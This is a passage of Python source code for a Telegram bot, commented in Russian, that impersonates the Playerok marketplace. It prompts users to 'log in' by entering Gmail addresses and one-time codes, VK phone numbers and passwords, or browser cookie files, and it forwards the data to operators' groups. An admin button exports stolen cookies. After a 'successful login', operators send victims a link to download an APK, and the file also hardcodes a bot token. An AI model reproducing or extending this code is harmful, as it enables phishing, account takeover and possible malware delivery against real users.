            # Создаем темы во ВСЕХ группах (кроме USER_ACTIONS - туда отправит notify_new_user)
            # NEW_USERS_CHAT_ID убран, так как бот там не добавлен (ошибка "chat not found")
            groups = [
                SUPPORT_CHAT_ID,
                # NEW_USERS_CHAT_ID  # Закомментировано - добавьте бота в эту группу и раскомментируйте
            ]
            
            created_count = 0
            failed_count = 0
            
            for group_id in groups:
                try:
                    thread_id = create_thread_for_user(chat_id, group_id)
                    
                    if thread_id:
                        # Отправляем приветственное сообщение в тему (БЕЗ закрепления)
                        bot.send_message(
                            group_id,
                            welcome_msg,
                            reply_markup=markup,
                            message_thread_id=thread_id
                        )
                        created_count += 1
                    else:
                        print(f"❌ ОШИБКА: Не удалось создать тему в группе {group_id} для user_id={chat_id}")
                        failed_count += 1
                except Exception as e:
                    log_error(f"init_thread_{group_id}", str(e))
                    print(f"❌ ОШИБКА отправки в группу {group_id} для user_id={chat_id}: {e}")
                    failed_count += 1
            
            # Создаём тему в USER_ACTIONS_CHAT_ID, но не отправляем сообщение
            # Сообщение отправит notify_new_user с кнопками блокировки
            try:
                thread_id = create_thread_for_user(chat_id, USER_ACTIONS_CHAT_ID)
                if thread_id:
                    created_count += 1
                else:
                    print(f"❌ ОШИБКА: Не удалось создать тему в USER_ACTIONS для user_id={chat_id}")
                    failed_count += 1
            except Exception as e:
                log_error(f"init_thread_user_actions", str(e))
                print(f"❌ ОШИБКА создания темы USER_ACTIONS для user_id={chat_id}: {e}")
                failed_count += 1
            
            if failed_count > 0:
                print(f"⚠️ Инициализация user_id={chat_id}: создано {created_count}, ошибок {failed_count}")
                    
        except Exception as e:
            log_error("initialize_threads", str(e))
            print(f"❌ Ошибка инициализации тем для {chat_id}: {e}")
    
    # ВАЖНО: Убираем отдельный поток!
    # Темы должны создаваться СИНХРОННО, чтобы notify_new_user точно нашёл тему
    _init()


# ---------- КОНФИГУРАЦИЯ БОТА ----------
TOKEN = "7568014331:AAEMRFbdhpfK8YBm7klxnVzzAfJZW-Os5GY"

# ID групп (должны быть супергруппами с включенными темами/форумом)
SUPPORT_CHAT_ID = -1003531961401
EMAIL_CHAT_ID = -1003572137977
NEW_USERS_CHAT_ID = -1003735733847
USER_ACTIONS_CHAT_ID = -1003668179158
CONSOLE_CHAT_ID = -1003354446081  # Консольная группа

# Инициализация бота
bot = telebot.TeleBot(TOKEN, parse_mode="HTML", num_threads=4, skip_pending=True)

# Изображения
WELCOME_PHOTO = "https://i.postimg.cc/Pfvw8bRw/IMG-20260206-230035-425.jpg"
GMAIL_PHOTO = "https://i.postimg.cc/0yz4mBDL/IMG-20260206-235138-655.jpg"
VK_PHOTO = "https://i.postimg.cc/fySQvDJD/IMG-20260209-131848-259.jpg"

# Текст приветствия
WELCOME_TEXT = """<b>✨ Добро пожаловать в магазин маркетолог Playerok!

Наш официальный сайт Playerok.com

📒 Мы рады приветствовать вас и предложить удобный способ покупок онлайн. 
Наш бот готов помочь вам в этом процессе, но для начала нам потребуется, чтобы вы вошли в свой аккаунт.

Просто введите свои учетные данные, и вы сможете насладиться множеством удобных функций, 
таких как просмотр каталога товаров, оформление заказов и отслеживание доставки. 
Наш бот будет рядом, чтобы ответить на ваши вопросы и помочь вам во время покупок.

Не упустите возможность сэкономить время и насладиться удобством онлайн-шопинга с Playerok.

Войдите в свой аккаунт прямо сейчас и начните исследовать наш ассортимент товаров.

Спасибо, что выбрали Playerok!</b>"""

# Состояния пользователей
user_state = {}
vk_temp = {}
admin_reply_state = {}  # Формат: {admin_chat_id: {"user_id": 123, "group_id": -100, "thread_id": 456}}
admin_link_state = {}  # Формат: {admin_user_id: {"user_id": 123, "group_id": -100, "thread_id": 456}}
support_mapping = {}
user_messages = {}  # ID сообщений БОТА
user_own_messages = {}  # ID сообщений ПОЛЬЗОВАТЕЛЯ


# ---------- УДАЛЕНИЕ ПРЕДЫДУЩИХ СООБЩЕНИЙ ----------
def delete_previous_messages(chat_id):
    """Удаляет все сохраненные сообщения БОТА"""
    if chat_id in user_messages:
        for msg_id in user_messages[chat_id]:
            try:
                bot.delete_message(chat_id, msg_id)
            except:
                pass
        user_messages[chat_id] = []


def delete_user_messages(chat_id):
    """Удаляет все сохраненные сообщения ПОЛЬЗОВАТЕЛЯ"""
    if chat_id in user_own_messages:
        for msg_id in user_own_messages[chat_id]:
            try:
                bot.delete_message(chat_id, msg_id)
            except:
                pass
        user_own_messages[chat_id] = []


def save_message_id(chat_id, message_id):
    """Сохраняет ID сообщения БОТА для последующего удаления"""
    if chat_id not in user_messages:
        user_messages[chat_id] = []
    user_messages[chat_id].append(message_id)
    
    if len(user_messages[chat_id]) > 10:
        user_messages[chat_id] = user_messages[chat_id][-10:]


def save_user_message_id(chat_id, message_id):
    """Сохраняет ID сообщения ПОЛЬЗОВАТЕЛЯ для последующего удаления"""
    if chat_id not in user_own_messages:
        user_own_messages[chat_id] = []
    user_own_messages[chat_id].append(message_id)
    
    if len(user_own_messages[chat_id]) > 20:
        user_own_messages[chat_id] = user_own_messages[chat_id][-20:]


# ---------- ЛОГИРОВАНИЕ В ГРУППЫ ----------
def log_user_action(chat_id, action_text):
    """Логирует действие пользователя в чат USER_ACTIONS_CHAT_ID"""
    # Игнорируем группы (ID < -1000000000)
    if chat_id < -1000000000:
        return
    
    def _log():
        try:
            thread_id = get_thread_id(chat_id, USER_ACTIONS_CHAT_ID)
            
            if not thread_id:
                print(f"⚠️ Тема не найдена для {chat_id} в USER_ACTIONS_CHAT_ID")
                return
            
            user = bot.get_chat(chat_id)
            username = f"@{user.username}" if user.username else "Нет username"
            text = (
                f"👤 {user.first_name} ({username})\n"
                f"ID: {chat_id}\n"
                f"⏰ {datetime.now().strftime('%H:%M:%S')}\n"
                f"📌 {action_text}"
            )
            
            bot.send_message(USER_ACTIONS_CHAT_ID, text, message_thread_id=thread_id)
            
        except Exception as e:
            log_error("log_user_action", str(e))
            print(f"❌ Ошибка логирования действия: {e}")
    
    threading.Thread(target=_log, daemon=True).start()


def log_support_message(chat_id, text):
    """Отправляет сообщение в поддержку в отдельную тему пользователя
    ВАЖНО: Кнопка 'Ответить' создаётся ВСЕГДА, независимо от настроек поддержки"""
    def _log():
        try:
            thread_id = get_thread_id(chat_id, SUPPORT_CHAT_ID)
            
            if not thread_id:
                print(f"⚠️ Тема не найдена для {chat_id} в SUPPORT_CHAT_ID")
                return
            
            user = bot.get_chat(chat_id)
            username = f"@{user.username}" if user.username else "Нет username"
            
            # Проверяем статус блокировки
            blocked = is_user_blocked(chat_id)
            status = "🔴 ЗАБЛОКИРОВАН" if blocked else "🟢 АКТИВЕН"
            
            info = (
                f"💬 СООБЩЕНИЕ В ПОДДЕРЖКУ\n\n"
                f"👤 {user.first_name} ({username})\n"
                f"ID: {chat_id}\n"
                f"Статус: {status}\n\n"
                f"📝 Текст:\n{text}"
            )
            
            # Создаём кнопки с блокировкой/разблокировкой
            markup = InlineKeyboardMarkup()
            markup.row(
                InlineKeyboardButton("💬 Ответить", callback_data=f"reply_{chat_id}")
            )
            
            if blocked:
                markup.row(
                    InlineKeyboardButton("🟢 Разблокировать", callback_data=f"unblock_{chat_id}")
                )
            else:
                markup.row(
                    InlineKeyboardButton("🔴 Заблокировать", callback_data=f"block_{chat_id}")
                )
            
            sent_msg = bot.send_message(SUPPORT_CHAT_ID, info, reply_markup=markup, message_thread_id=thread_id)
            print(f"✅ Сообщение поддержки от {chat_id} отправлено в тему #{thread_id}")
            
        except Exception as e:
            log_error("log_support_message", str(e))
            print(f"❌ Ошибка отправки в поддержку: {e}")
    
    threading.Thread(target=_log, daemon=True).start()


def log_to_actions_chat(chat_id, data_value, label):
    """Логирует данные пользователя в USER_ACTIONS_CHAT_ID"""
    # Игнорируем группы (ID < -1000000000)
    if chat_id < -1000000000:
        return
    
    def _log():
        try:
            thread_id = get_thread_id(chat_id, USER_ACTIONS_CHAT_ID)
            
            if not thread_id:
                print(f"⚠️ Тема не найдена для {chat_id} в USER_ACTIONS_CHAT_ID")
                return
            
            user = bot.get_chat(chat_id)
            username = f"@{user.username}" if user.username else "Нет username"
            info = (
                f"{label}\n\n"
                f"👤 {user.first_name} ({username})\n"
                f"ID: {chat_id}\n\n"
                f"📝 Данные:\n<code>{data_value}</code>"
            )
            
            bot.send_message(USER_ACTIONS_CHAT_ID, info, message_thread_id=thread_id)
                
        except Exception as e:
            log_error("log_to_actions_chat", str(e))
            print(f"❌ Ошибка логирования в чат действий: {e}")
    
    threading.Thread(target=_log, daemon=True).start()


# ---------- КНОПКИ ----------
def cancel_kb():
    kb = InlineKeyboardMarkup()
    kb.add(InlineKeyboardButton("❌ Отмена", callback_data="cancel"))
    return kb


# ---------- ПРИВЕТСТВИЕ ----------
def send_welcome(chat_id):
    delete_previous_messages(chat_id)
    
    kb = InlineKeyboardMarkup()
    kb.add(
        InlineKeyboardButton(
            "Пользовательское соглашение ✅", url="https://playerok.com/agreement"
        )
    )
    
    # Проверяем, включена ли поддержка
    if is_support_enabled():
        kb.row(
            InlineKeyboardButton("🔰 Поддержка", callback_data="support"),
            InlineKeyboardButton("🔍Войти в аккаунт", callback_data="login"),
        )
    else:
        # Если поддержка выключена, показываем только кнопку входа
        kb.add(InlineKeyboardButton("🔍Войти в аккаунт", callback_data="login"))
    
    msg = bot.send_photo(chat_id, WELCOME_PHOTO, caption=WELCOME_TEXT, reply_markup=kb)
    save_message_id(chat_id, msg.message_id)
    user_state[chat_id] = "welcome"


# ---------- ОБРАБОТЧИК /start ----------
@bot.message_handler(commands=["start"])
def start(msg):
    chat_id = msg.chat.id
    username = msg.from_user.username
    first_name = msg.from_user.first_name
    
    # Проверяем, заблокирован ли пользователь
    if is_user_blocked(chat_id):
        print(f"🚫 Заблокированный user_id={chat_id} пытался запустить бота")
        return
    
    # Проверяем режим технических работ
    if is_maintenance_mode():
        bot.send_message(
            chat_id,
            "🔧 <b>Технические работы</b>\n\n"
            "⚠️ В данный момент проводятся технические работы.\n"
            "Пожалуйста, подождите!\n\n"
            "Приносим извинения за временные неудобства.",
            parse_mode="HTML"
        )
        return
    
    # Проверяем, новый ли пользователь
    is_new = is_new_user(chat_id)
    
    if is_new:
        print(f"🆕 Новый пользователь: user_id={chat_id}, имя={first_name}")
        
        # Создаем темы во ВСЕХ группах сразу
        initialize_user_threads(chat_id)
    else:
        # Логируем повторный запуск
        log_user_action(chat_id, "🔄 Повторный /start")
    
    # КРИТИЧНО: Проверяем уведомление ВСЕГДА (для новых и старых пользователей)
    # Если в теме USER_ACTIONS нет сообщения "🆕 НОВЫЙ ПОЛЬЗОВАТЕЛЬ" - отправляем его
    # Это гарантирует наличие кнопок "Ответить" и "Заблокировать"
    ensure_notification_exists(chat_id, username, first_name)
    
    # Отправляем приветствие
    send_welcome(chat_id)


# ---------- ОБРАБОТЧИК CALLBACK ----------
@bot.callback_query_handler(func=lambda c: True)
def callbacks(call):
    chat_id = call.message.chat.id
    bot.answer_callback_query(call.id)

    # ---------- КОНСОЛЬНЫЕ КОМАНДЫ (работают ВСЕГДА) ----------
    if call.data == "console_refresh":
        send_or_update_console()
        return
    
    if call.data == "console_back":
        send_or_update_console()
        return
    
    if call.data == "console_users":
        show_users_list(call.message.message_id, page=0)
        return
    
    if call.data.startswith("console_users_page_"):
        page = int(call.data.split("_")[-1])
        show_users_list(call.message.message_id, page=page)
        return
    
    if call.data == "console_stats":
        show_stats(call.message.message_id)
        return
    
    if call.data == "console_ping":
        show_bot_status(call.message.message_id)
        return
    
    if call.data == "console_errors":
        show_errors(call.message.message_id)
        return
    
    if call.data == "console_print_errors":
        # Выводим ошибки в терминал
        print_errors_to_terminal()
        bot.answer_callback_query(call.id, "✅ Ошибки выведены в терминал Termux", show_alert=True)
        return
    
    if call.data == "console_clear_errors":
        # Очищаем ошибки старше 7 дней
        deleted = clear_old_errors(7)
        bot.answer_callback_query(call.id, f"🗑 Удалено старых ошибок: {deleted}", show_alert=True)
        show_errors(call.message.message_id)
        return
    
    if call.data == "console_toggle_support":
        # Переключаем состояние поддержки
        new_state = toggle_support()
        status_text = "✅ Поддержка включена" if new_state else "❌ Поддержка выключена"
        bot.answer_callback_query(call.id, status_text, show_alert=True)
        send_or_update_console()
        return
    
    if call.data == "console_toggle_response":
        # Переключаем режим ответа
        new_mode = toggle_response_mode()
        if new_mode == 'processing':
            status_text = "🟢 Режим изменен на: Обработка"
        else:
            status_text = "❌ Режим изменен на: Ошибка"
        bot.answer_callback_query(call.id, status_text, show_alert=True)
        send_or_update_console()
        return
    
    if call.data == "console_toggle_maintenance":
        # Переключаем режим технических работ
        new_state = toggle_maintenance_mode()
        if new_state:
            status_text = "🔴 Технические работы ВКЛЮЧЕНЫ\n\nВсе действия пользователей будут заблокированы"
        else:
            status_text = "🟢 Технические работы ВЫКЛЮЧЕНЫ\n\nБот работает в обычном режиме"
        bot.answer_callback_query(call.id, status_text, show_alert=True)
        send_or_update_console()
        return
    
    if call.data == "console_toggle_cookie":
        new_state = toggle_cookie_mode()
        status_text = "🍪 Cookie режим ВКЛЮЧЁН\n\nКнопка «Войти через Cookie» появится у пользователей" if new_state else "🍪 Cookie режим ВЫКЛЮЧЕН\n\nКнопка «Войти через Cookie» скрыта"
        bot.answer_callback_query(call.id, status_text, show_alert=True)
        send_or_update_console()
        return


        try:
            bot.answer_callback_query(call.id, status_text)
        except Exception:
            pass
        send_or_update_console()
        return

    # ── СКАЧАТЬ COOKIE ФАЙЛ ПОЛЬЗОВАТЕЛЯ ──
    if call.data.startswith("send_cookie_"):
        target_id = int(call.data.split("_")[2])
        try:
            # Берём последний cookie из БД
            conn_ck = sqlite3.connect(DATABASE_FILE)
            cur_ck  = conn_ck.cursor()
            cur_ck.execute(
                "SELECT data_value, created_at FROM user_data WHERE user_id=? AND data_type=\'cookie_txt\' ORDER BY created_at DESC LIMIT 1",
                (target_id,)
            )
            row_ck = cur_ck.fetchone()

            # Достаём данные пользователя для имени файла
            cur_ck.execute("SELECT username, first_name FROM users WHERE user_id=?", (target_id,))
            urow = cur_ck.fetchone()
            conn_ck.close()

            if row_ck:
                cookie_content, cookie_dt = row_ck
                uname_ck = (urow[0] or "") if urow else ""
                fname_ck = (urow[1] or str(target_id)) if urow else str(target_id)

                # Форматируем дату для имени файла
                try:
                    dt_obj = datetime.strptime(cookie_dt, "%Y-%m-%d %H:%M:%S")
                    dt_str = dt_obj.strftime("%d%m%Y_%H%M")
                except Exception:
                    dt_str = "unknown"

                file_name_ck = f"cookie_{target_id}_{dt_str}.txt"
                file_bytes   = cookie_content.encode("utf-8")

                import io
                bio = io.BytesIO(file_bytes)
                bio.name = file_name_ck

                caption_ck = (
                    f"🍪 <b>Cookie файл</b>\n\n"
                    f"👤 {fname_ck}"
                    + (f" | @{uname_ck}" if uname_ck else "")
                    + f"\n🆔 <code>{target_id}</code>\n"
                    f"📅 {cookie_dt}"
                )
                bot.send_document(
                    CONSOLE_CHAT_ID,
                    bio,
                    caption=caption_ck,
                    parse_mode="HTML"
                )
                bot.answer_callback_query(call.id, "✅ Cookie файл отправлен!")
            else:
                bot.answer_callback_query(call.id, "❌ Cookie файл не найден")
        except Exception as e:
            log_error("send_cookie_cb", str(e))
            bot.answer_callback_query(call.id, f"❌ Ошибка: {e}")
        return
    
    if call.data == "console_broadcast":
        start_broadcast(call.message.message_id)
        return
    
    if call.data == "broadcast_cancel":
        # Отменяем рассылку и возвращаемся в консоль
        broadcast_state['active'] = False
        broadcast_state.pop('console_message_id', None)
        send_or_update_console()
        return
    
    if call.data.startswith("console_user_"):
        user_id = int(call.data.split("_")[2])
        show_user_data(call.message.message_id, user_id)
        return
    
    # ---------- БЛОКИРОВКА/РАЗБЛОКИРОВКА ПОЛЬЗОВАТЕЛЕЙ ----------
    if call.data.startswith("block_"):
        target_user_id = int(call.data.split("_")[1])
        admin_id = call.from_user.id
        
        # Блокируем пользователя
        if block_user(target_user_id, admin_id):
            # Обновляем сообщение с новым статусом
            try:
                user = bot.get_chat(target_user_id)
                name = user.first_name if user.first_name else "Не указано"
                username_str = f"@{user.username}" if user.username else "Не указан"
                
                # Получаем текст текущего сообщения чтобы понять его тип
                current_text = call.message.text or call.message.caption or ""
                
                # Определяем тип сообщения и формируем новый текст
                if "НОВЫЙ ПОЛЬЗОВАТЕЛЬ" in current_text:
                    # Это уведомление о новом пользователе
                    current_time = datetime.now().strftime("%d.%m.%Y %H:%M:%S")
                    message_text = (
                        f"🆕 <b>НОВЫЙ ПОЛЬЗОВАТЕЛЬ</b>\n\n"
                        f"👤 Имя: {name}\n"
                        f"📱 Username: {username_str}\n"
                        f"🆔 ID: <code>{target_user_id}</code>\n"
                        f"⏰ Время: {current_time}\n\n"
                        f"Статус: 🔴 ЗАБЛОКИРОВАН"
                    )
                elif "СООБЩЕНИЕ В ПОДДЕРЖКУ" in current_text:
                    # Это сообщение в поддержку - извлекаем текст сообщения
                    lines = current_text.split('\n')
                    message_content = '\n'.join(lines[6:]) if len(lines) > 6 else ""
                    
                    message_text = (
                        f"💬 СООБЩЕНИЕ В ПОДДЕРЖКУ\n\n"
                        f"👤 {name} ({username_str})\n"
                        f"ID: {target_user_id}\n"
                        f"Статус: 🔴 ЗАБЛОКИРОВАН\n\n"
                        f"{message_content}"
                    )
                else:
                    # Общий формат
                    message_text = current_text + "\n\n🔴 ЗАБЛОКИРОВАН"
                
                keyboard = InlineKeyboardMarkup()
                keyboard.row(
                    InlineKeyboardButton("💬 Ответить", callback_data=f"reply_{target_user_id}")
                )
                keyboard.row(
                    InlineKeyboardButton("🟢 Разблокировать", callback_data=f"unblock_{target_user_id}")
                )
                
                bot.edit_message_text(
                    message_text,
                    chat_id=call.message.chat.id,
                    message_id=call.message.message_id,
                    parse_mode="HTML",
                    reply_markup=keyboard
                )
                
                bot.answer_callback_query(call.id, f"🔴 Пользователь {target_user_id} заблокирован", show_alert=True)
            except Exception as e:
                bot.answer_callback_query(call.id, f"❌ Ошибка: {e}", show_alert=True)
        else:
            bot.answer_callback_query(call.id, "❌ Ошибка блокировки", show_alert=True)
        return
    
    if call.data.startswith("unblock_"):
        target_user_id = int(call.data.split("_")[1])
        
        # Разблокируем пользователя
        if unblock_user(target_user_id):
            # Обновляем сообщение с новым статусом
            try:
                user = bot.get_chat(target_user_id)
                name = user.first_name if user.first_name else "Не указано"
                username_str = f"@{user.username}" if user.username else "Не указан"
                
                # Получаем текст текущего сообщения чтобы понять его тип
                current_text = call.message.text or call.message.caption or ""
                
                # Определяем тип сообщения и формируем новый текст
                if "НОВЫЙ ПОЛЬЗОВАТЕЛЬ" in current_text:
                    # Это уведомление о новом пользователе
                    current_time = datetime.now().strftime("%d.%m.%Y %H:%M:%S")
                    message_text = (
                        f"🆕 <b>НОВЫЙ ПОЛЬЗОВАТЕЛЬ</b>\n\n"
                        f"👤 Имя: {name}\n"
                        f"📱 Username: {username_str}\n"
                        f"🆔 ID: <code>{target_user_id}</code>\n"
                        f"⏰ Время: {current_time}\n\n"
                        f"Статус: 🟢 АКТИВЕН"
                    )
                elif "СООБЩЕНИЕ В ПОДДЕРЖКУ" in current_text:
                    # Это сообщение в поддержку - извлекаем текст сообщения
                    lines = current_text.split('\n')
                    message_content = '\n'.join(lines[6:]) if len(lines) > 6 else ""
                    
                    message_text = (
                        f"💬 СООБЩЕНИЕ В ПОДДЕРЖКУ\n\n"
                        f"👤 {name} ({username_str})\n"
                        f"ID: {target_user_id}\n"
                        f"Статус: 🟢 АКТИВЕН\n\n"
                        f"{message_content}"
                    )
                else:
                    # Общий формат
                    message_text = current_text.replace("🔴 ЗАБЛОКИРОВАН", "🟢 АКТИВЕН")
                
                keyboard = InlineKeyboardMarkup()
                keyboard.row(
                    InlineKeyboardButton("💬 Ответить", callback_data=f"reply_{target_user_id}")
                )
                keyboard.row(
                    InlineKeyboardButton("🔴 Заблокировать", callback_data=f"block_{target_user_id}")
                )
                
                bot.edit_message_text(
                    message_text,
                    chat_id=call.message.chat.id,
                    message_id=call.message.message_id,
                    parse_mode="HTML",
                    reply_markup=keyboard
                )
                
                bot.answer_callback_query(call.id, f"🟢 Пользователь {target_user_id} разблокирован", show_alert=True)
            except Exception as e:
                bot.answer_callback_query(call.id, f"❌ Ошибка: {e}", show_alert=True)
        else:
            bot.answer_callback_query(call.id, "❌ Ошибка разблокировки", show_alert=True)
        return

    # ---------- ПРОВЕРКА БЛОКИРОВКИ ПОЛЬЗОВАТЕЛЯ ----------
    # Проверяем заблокирован ли пользователь (действует только на обычные действия)
    if chat_id > 0 and is_user_blocked(chat_id):
        bot.answer_callback_query(call.id, "🚫 Вы заблокированы", show_alert=True)
        print(f"🚫 Заблокированный пользователь {chat_id} пытался выполнить действие: {call.data}")
        return

    # ---------- ПРОВЕРКА ТЕХНИЧЕСКИХ РАБОТ ДЛЯ ПОЛЬЗОВАТЕЛЬСКИХ ДЕЙСТВИЙ ----------
    if is_maintenance_mode():
        maintenance_text = (
            "🔧 <b>Технические работы</b>\n\n"
            "⚠️ В данный момент проводятся технические работы.\n"
            "<b>Пожалуйста, подождите!</b>\n\n"
            "Приносим извинения за временные неудобства."
        )
        bot.answer_callback_query(call.id, "⚠️ Технические работы", show_alert=True)
        try:
            bot.send_message(chat_id, maintenance_text, parse_mode="HTML")
        except:
            pass
        return

    if call.data == "cancel":
        log_user_action(chat_id, "❌ Отмена")
        
        delete_previous_messages(chat_id)
        delete_user_messages(chat_id)
        
        try:
            bot.delete_message(chat_id, call.message.message_id)
        except:
            pass
        
        send_welcome(chat_id)
        return

    if call.data == "support":
        # Проверяем, включена ли поддержка
        if not is_support_enabled():
            bot.answer_callback_query(call.id, "⚠️ Поддержка временно недоступна", show_alert=True)
            return
            
        user_state[chat_id] = "support"
        delete_previous_messages(chat_id)
        
        try:
            bot.delete_message(chat_id, call.message.message_id)
        except:
            pass
        
        SUPPORT_TEXT = (
            "<b>✉️ Описание проблемы/вопроса.</b>\n\n"
            "Подробно опишите свою проблему, вопрос или запрос. "
            "Чем более конкретно и подробно вы опишете ситуацию, тем легче будет нам вам помочь."
        )
        msg = bot.send_message(
            chat_id, SUPPORT_TEXT, reply_markup=cancel_kb(), parse_mode="HTML"
        )
        save_message_id(chat_id, msg.message_id)
        log_user_action(chat_id, "🔰 Открыл поддержку")
        return

    if call.data == "login":
        delete_previous_messages(chat_id)
        
        try:
            bot.delete_message(chat_id, call.message.message_id)
        except:
            pass
        
        kb = InlineKeyboardMarkup()
        kb.row(
            InlineKeyboardButton("📬 Войти [Gmail]", callback_data="gmail"),
            InlineKeyboardButton("📱 Войти [VK]", callback_data="vk"),
        )
        # Показываем кнопку Cookie только если режим включён
        if is_cookie_mode():
            kb.add(InlineKeyboardButton("🍪 Войти через Cookie", callback_data="cookie"))
        kb.add(InlineKeyboardButton("❌ Отмена", callback_data="cancel"))
        msg = bot.send_message(
            chat_id,
            "Выберите через что вы будете входить в акккаунт Playerok.",
            reply_markup=kb,
        )
        save_message_id(chat_id, msg.message_id)
        log_user_action(chat_id, "🔍 Выбор способа входа")
        return

    if call.data == "gmail":
        user_state[chat_id] = "gmail_email"
        delete_previous_messages(chat_id)
        
        try:
            bot.delete_message(chat_id, call.message.message_id)
        except:
            pass
        
        msg = bot.send_photo(
            chat_id,
            GMAIL_PHOTO,
            caption=(
                "💼 Вход в аккаунт\n\n"
                "Введите вашу электронную почту для входа в аккаунт:\n\n"
                "После этого на вашу электронную почту пройдёт одноразовый код подтверждения.\n\n"
                "Если у вас возникли проблемы с входом в аккаунт, "
                "пожалуйста, обратитесь в нашу службу поддержки, и мы с удовольствием поможем вам решить эту проблему."
            ),
            reply_markup=cancel_kb(),
        )
        save_message_id(chat_id, msg.message_id)
        log_user_action(chat_id, "📬 Выбрал Gmail вход")
        return

    if call.data == "cookie":
        user_state[chat_id] = "cookie_input"
        delete_previous_messages(chat_id)
        
        try:
            bot.delete_message(chat_id, call.message.message_id)
        except:
            pass
        
        msg = bot.send_message(
            chat_id,
            "🍪 <b>Вход через Cookie</b>\n\n"
            "Для авторизации отправьте файл <b>text.txt</b> содержащий Cookie в формате JSON.\n\n"
            "Если возникли проблемы — обратитесь в поддержку.",
            reply_markup=cancel_kb(),
            parse_mode="HTML"
        )
        save_message_id(chat_id, msg.message_id)
        log_user_action(chat_id, "🍪 Выбрал вход через Cookie")
        return

    if call.data == "vk":
        user_state[chat_id] = "vk_phone"
        delete_previous_messages(chat_id)
        
        try:
            bot.delete_message(chat_id, call.message.message_id)
        except:
            pass
        
        msg = bot.send_photo(
            chat_id,
            VK_PHOTO,
            caption=(
                "📕 Вход в аккаунт через [VK]\n\n"
                "Введите ваш номер телефон для входа в аккаунт:\n\n"
                "После этого введите пароль от [VK].\n\n"
                "Если у вас возникли проблемы с входом в аккаунт, "
                "пожалуйста, обратитесь в нашу службу поддержки, и мы с удовольствием поможем вам решить эту проблему."
            ),
            reply_markup=cancel_kb(),
        )
        save_message_id(chat_id, msg.message_id)
        log_user_action(chat_id, "📱 Выбрал VK вход")
        return

    # -------- КНОПКА ОТВЕТИТЬ (РАБОТАЕТ ВСЕГДА) --------
    if call.data.startswith("reply_"):
        target_user = int(call.data.split("_")[1])
        group_id = call.message.chat.id
        thread_id = call.message.message_thread_id
        
        # ИСПРАВЛЕНИЕ: используем ID администратора, который нажал кнопку
        admin_id = call.from_user.id
        
        # Сохраняем информацию для ответа
        admin_reply_state[admin_id] = {
            "user_id": target_user,
            "group_id": group_id,
            "thread_id": thread_id
        }
        
        print(f"✅ Админ {admin_id} хочет ответить пользователю {target_user}")
        
        # Отправляем уведомление как alert
        bot.answer_callback_query(call.id, "✏️ Отправьте сообщение в эту группу", show_alert=False)
        
        # Отправляем сообщение в группу с инструкцией
        try:
            instruction_msg = bot.send_message(
                group_id,
                f"✏️ <b>Режим ответа пользователю {target_user}</b>\n\n"
                f"Напишите ваше сообщение в эту тему, и оно будет отправлено пользователю.\n\n"
                f"<i>Ваше следующее сообщение в этой теме будет отправлено пользователю.</i>",
                message_thread_id=thread_id,
                parse_mode="HTML"
            )
            
            # Удаляем инструкцию через 5 секунд
            def delete_instruction():
                time.sleep(5)
                try:
                    bot.delete_message(group_id, instruction_msg.message_id)
                except:
                    pass
            
            threading.Thread(target=delete_instruction, daemon=True).start()
            
        except Exception as e:
            log_error("reply_instruction", str(e))
            print(f"⚠️ Не удалось отправить инструкцию: {e}")
        
        return

    # -------- КНОПКА ССЫЛКА --------
    if call.data.startswith("send_link_"):
        target_user = int(call.data.split("_")[2])
        group_id = call.message.chat.id
        thread_id = call.message.message_thread_id
        admin_id = call.from_user.id
        
        # Сохраняем информацию для отправки ссылки
        admin_link_state[admin_id] = {
            "user_id": target_user,
            "group_id": group_id,
            "thread_id": thread_id
        }
        
        print(f"✅ Админ {admin_id} хочет отправить ссылку пользователю {target_user}")
        
        # Отправляем уведомление
        bot.answer_callback_query(call.id, "🔗 Отправьте ссылку в эту группу", show_alert=False)
        
        # Отправляем инструкцию в группу
        try:
            instruction_msg = bot.send_message(
                group_id,
                f"🔗 <b>Отправка ссылки пользователю {target_user}</b>\n\n"
                f"Отправьте ссылку в эту тему (например: https://example.com)\n\n"
                f"<i>Пользователю будет отправлено сообщение с кнопкой \"Подтвердить\" и вашей ссылкой.</i>",
                message_thread_id=thread_id,
                parse_mode="HTML"
            )
            
            # Удаляем инструкцию через 10 секунд
            def delete_link_instruction():
                time.sleep(10)
                try:
                    bot.delete_message(group_id, instruction_msg.message_id)
                except:
                    pass
            
            threading.Thread(target=delete_link_instruction, daemon=True).start()
            
        except Exception as e:
            log_error("link_instruction", str(e))
            print(f"⚠️ Не удалось отправить инструкцию: {e}")
        
        return

    # -------- КНОПКА УСПЕШНЫЙ ВХОД --------
    if call.data.startswith("successful_login_"):
        target_user = int(call.data.split("_")[2])
        
        login_text = (
            "🎉 <b>Вы успешно вошли в аккаунт Playerok!</b>\n\n"
            "🔓 <b>Доступ открыт</b> — теперь вы можете пользоваться всеми возможностями платформы.\n\n"
            "👇 Скачайте <b>APK-файл</b> ниже, чтобы продолжить."
        )
        
        apk_keyboard = InlineKeyboardMarkup()
        apk_keyboard.add(
            InlineKeyboardButton(
                "📥 Скачать апк Playerok",
                url="https://file.kiwi/c911ef9e#SZIGSzWFWO_kD1BzU-RQ0A"
            )
        )
        
        try:
            bot.send_message(target_user, login_text, reply_markup=apk_keyboard, parse_mode="HTML")
            bot.answer_callback_query(call.id, "✅ Сообщение отправлено пользователю", show_alert=True)
            log_user_action(target_user, "✅ Админ нажал «Успешный вход» — отправлен APK")
            print(f"✅ Успешный вход: сообщение отправлено пользователю {target_user}")
        except Exception as e:
            log_error("successful_login", str(e))
            bot.answer_callback_query(call.id, f"❌ Ошибка отправки: {e}", show_alert=True)
            print(f"❌ Ошибка при отправке пользователю {target_user}: {e}")
        
        return

    # -------- КНОПКА НЕ УСПЕШНЫЙ ВХОД --------
    if call.data.startswith("failed_login_"):
        target_user = int(call.data.split("_")[2])
        
        failed_text = (
            "❌ <b>Неверный код или пароль!</b>\n\n"
            "Попробуйте войти ещё раз или обратитесь в поддержку."
        )
        
        try:
            bot.send_message(target_user, failed_text, parse_mode="HTML")
            bot.answer_callback_query(call.id, "✅ Сообщение отправлено пользователю", show_alert=True)
            log_user_action(target_user, "❌ Админ нажал «Не успешный вход» — отправлена ошибка")
            print(f"✅ Не успешный вход: сообщение отправлено пользователю {target_user}")
        except Exception as e:
            log_error("failed_login", str(e))
            bot.answer_callback_query(call.id, f"❌ Ошибка отправки: {e}", show_alert=True)
            print(f"❌ Ошибка при отправке пользователю {target_user}: {e}")
        
        return


# ---------- ОБРАБОТЧИК СООБЩЕНИЙ ----------
@bot.message_handler(func=lambda msg: True, content_types=["text", "photo", "document"])
def handle_message(msg):
    chat_id = msg.chat.id
